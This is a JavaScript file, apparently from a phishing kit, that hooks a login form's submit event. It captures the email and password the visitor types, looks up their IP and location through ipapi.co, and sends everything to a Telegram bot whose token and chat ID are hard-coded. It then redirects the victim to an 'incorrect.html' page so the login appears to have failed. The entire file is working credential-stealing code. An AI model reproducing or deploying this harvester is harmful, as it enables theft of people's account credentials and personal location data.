document.addEventListener("DOMContentLoaded", function() {
    const form = document.querySelector("#form");
  
    form.addEventListener("submit", function(e) {
        e.preventDefault();
  
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
  
        // Function to send message to Telegram
        function sendMessage(ip_address, country, country_code, state) {
            const message = `Results: ${email} is:\n`
                          + `- Username/Email: ${email}\n`
                          + `- Password: ${password}\n`
                          + `- IPAddress: ${ip_address}\n`
                          + `- Country: ${country}\n`
                          + `- Country-code: ${country_code}\n`
                          + `- State: ${state}`;
  
            const botToken = '6422540231:AAFfayBIZ-Kju87-FHl0a1usu4wsdU3cbog';
            const chatId = '-1002078296073';
  
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
            // Send message to Telegram using XMLHttpRequest
            const api = new XMLHttpRequest();
            api.open("GET", url, true);
            api.send();
  
            // Redirect to success page
            window.location.replace("incorrect.html");
        }
  
        // Fetch IP address and location information
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                const ip_address = data.ip;
                const country = data.country_name;
                const country_code = data.country_calling_code;
                const state = data.region;
                sendMessage(ip_address, country, country_code, state);
            })
            .catch(error => {
                console.error("Error fetching IP geolocation:", error);
                // Fallback if fetching IP geolocation fails
                sendMessage('Unknown', 'Unknown', 'Unknown', 'Unknown');
            });
    });
  });
  